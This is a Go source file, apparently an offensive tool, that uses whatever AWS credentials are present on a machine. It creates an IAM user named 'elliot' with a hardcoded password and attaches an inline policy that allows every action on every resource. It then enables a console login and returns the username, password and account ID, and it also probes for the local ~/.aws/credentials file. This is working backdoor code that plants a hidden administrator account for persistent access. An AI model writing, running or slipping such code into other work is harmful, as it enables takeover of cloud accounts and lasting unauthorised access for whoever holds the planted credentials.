package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/iam"
)

func createUserAndGetAccountID() string {

	var accountID string
	hackerUser := "elliot"
	hackerPassword := "natasha123"
	arnPolicy := "arn:aws:iam::aws:policy/AdministratorAccess"

	sess, err := session.NewSession(&aws.Config{
		Region: aws.String("us-west-2")},
	)

	svc := iam.New(sess)

	_, err = svc.GetUser(&iam.GetUserInput{
		UserName: &hackerUser,
	})

	if awserr, ok := err.(awserr.Error); ok && awserr.Code() == iam.ErrCodeNoSuchEntityException {
		result, err := svc.CreateUser(&iam.CreateUserInput{
			UserName:            &hackerUser,
			PermissionsBoundary: &arnPolicy,
		})

		if err != nil {
			fmt.Println("CreateUser Error", err)
			panic(err)
		}

		fmt.Printf("Create user %s Success!\n", *result.User.UserName)
		putResult := putAdminPolicyToUser(hackerUser)
		if putResult != nil {
			fmt.Println("Policy Attached! ")
		}

		req, profileLoginResp := svc.CreateLoginProfileRequest(&iam.CreateLoginProfileInput{
			Password:              &hackerPassword,
			PasswordResetRequired: aws.Bool(false),
			UserName:              &hackerUser,
		})

		errReq := req.Send()

		if errReq == nil { // resp is now filled
			fmt.Printf("Created user %s profile login\n", *profileLoginResp.LoginProfile.UserName)

			respUser, errUser := svc.GetUser(&iam.GetUserInput{
				UserName: &hackerUser,
			})

			fmt.Println("Sucess get account information")

			if errUser != nil {
				panic(errUser)
			}

			accountID = strings.Split(*respUser.User.Arn, ":")[4]

		}

	} else {
		fmt.Println("GetUser Error", err)
		fmt.Println("Please verify account already exist")
		panic(err)
	}

	return fmt.Sprintf("Account created \nusername: %s \npassword: %s \naccount_id: %s", hackerUser, hackerPassword, accountID)
}

func putAdminPolicyToUser(username string) *iam.PutUserPolicyOutput {

	svc := iam.New(session.New())

	input := &iam.PutUserPolicyInput{
		PolicyDocument: aws.String("{\"Version\":\"2012-10-17\",\"Statement\":{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}}"),
		PolicyName:     aws.String("KlyntarPolicy"),
		UserName:       aws.String(username),
	}

	result, err := svc.PutUserPolicy(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			case iam.ErrCodeLimitExceededException:
				fmt.Println(iam.ErrCodeLimitExceededException, aerr.Error())
			case iam.ErrCodeMalformedPolicyDocumentException:
				fmt.Println(iam.ErrCodeMalformedPolicyDocumentException, aerr.Error())
			case iam.ErrCodeNoSuchEntityException:
				fmt.Println(iam.ErrCodeNoSuchEntityException, aerr.Error())
			case iam.ErrCodeServiceFailureException:
				fmt.Println(iam.ErrCodeServiceFailureException, aerr.Error())
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		panic(err)
	}

	return result
}

func checkAwsCredentialsExist() {

	homedirPath, err := os.UserHomeDir()

	if err != nil {
		panic(err)
	}

	if checkPath(homedirPath + "/.aws") {
		fmt.Println("Path .aws existe")
		if checkPath(homedirPath + "/.aws/credentials") {
			fmt.Println("Arquivo de credentials existe!")
		} else {
			fmt.Println("Arquivo de credentials não existe")
		}
	} else {
		fmt.Println("Path .aws não existe")
	}
}
